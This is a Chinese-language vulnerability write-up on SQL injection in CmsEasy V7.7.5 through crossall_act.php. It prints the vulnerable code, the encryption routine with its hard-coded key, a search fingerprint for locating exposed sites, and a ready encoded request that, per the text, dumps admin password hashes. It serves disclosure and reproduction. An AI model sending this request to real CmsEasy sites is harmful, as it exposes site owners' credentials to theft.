# CmsEasy crossall_act.php SQL注入漏洞

## 漏洞描述

CmsEasy 存在SQL注入漏洞，通过文件 service.php 加密SQL语句执行即可执行任意SQL命令

## 影响版本

<a-checkbox checked>CmsEasy V7.7.5_20210919</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="cmseasyedit" </a-checkbox></br>

## 环境搭建

<a-alert type="success" message="https://www.cmseasy.cn/chm/faq/show-645.html" description="" showIcon>
</a-alert>
<br/>



![img](../../../.vuepress/public/img/1632722654239-33f8ba2f-dfd8-48b9-bf8f-a93f1d2b2cba.png)

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1632722813176-a2c6d9c2-e5f5-483a-8448-775a9ce41d4a.png)

存在漏洞的文件为 `lib/default/crossall_act.php`

![img](../../../.vuepress/public/img/1632722883793-c37ad1c9-a41a-4517-b82d-db490c7745c2.png)

其中需要注意的代码为

```php
function execsql_action(){
        $sqlquery=front::get("sql");
        $sqlquery=service::getInstance()->unlockString($sqlquery,"cmseasy_sql");

        $returndata=tdatabase::getInstance()->rec_query_one($sqlquery);
        echo json_encode($returndata);
        exit;
    }
    function execsqls_action(){
            $sqlquery=front::get("sql");
            $sqlquery=service::getInstance()->unlockString($sqlquery,"cmseasy_sql");

            $returndata=tdatabase::getInstance()->rec_query($sqlquery);
            echo json_encode($returndata);
            exit;
        }
    function execupdate_action(){
        $sqlquery=front::get("sql");
        $sqlquery=service::getInstance()->unlockString($sqlquery,"cmseasy_sql");

        $returndata=tdatabase::getInstance()->query($sqlquery);
        echo json_encode($returndata);
        exit;
    }
```

代码中传入参数 sql， 然后使用方法 unlockString 解码执行 SQL语句

查看文件 `lib/table/service.php`

```php
public static function lockString($txt,$key='cmseasy_sql')
    {
        $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";
        $nh = rand(0,64);
        $ch = $chars[$nh];
        $mdKey = md5($key.$ch);
        $mdKey = substr($mdKey,$nh%8, $nh%8+8);
        $txt = base64_encode($txt);
        $tmp = '';
        $i=0;$j=0;$k = 0;
        for ($i=0; $i<strlen($txt); $i++) {
            $k = $k == strlen($mdKey) ? 0 : $k;
            $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64;
            $tmp .= $chars[$j];
        }
        return urlencode($ch.$tmp);
    }

    /**对字符串进行解密。 crossall_act文件使用
     * @param $txt
     * @param string $key
     * @return bool|string
     */
    public static function unlockString($txt,$key='cmseasy_sql')
    {
        $txt = urldecode($txt);
        $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";
        $ch = $txt[0];
        $nh = strpos($chars,$ch);
        $mdKey = md5($key.$ch);
        $mdKey = substr($mdKey,$nh%8, $nh%8+8);
        $txt = substr($txt,1);
        $tmp = '';
        $i=0;$j=0; $k = 0;
        for ($i=0; $i<strlen($txt); $i++) {
            $k = $k == strlen($mdKey) ? 0 : $k;
            $j = strpos($chars,$txt[$i])-$nh - ord($mdKey[$k++]);
            while ($j<0) $j+=64;
            $tmp .= $chars[$j];
        }
        return base64_decode($tmp);
    }
```

文件中得到了 `$key='cmseasy_sql'` 和加解密方法，构造请求获取账号密码md5

![img](../../../.vuepress/public/img/1632723167407-5949ee21-ee19-48d0-ba5b-2561018e317c.png)

```php
/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5
```

![img](../../../.vuepress/public/img/1632723217513-d1daad2d-635e-432f-b3c0-1f23e069fdcc.png)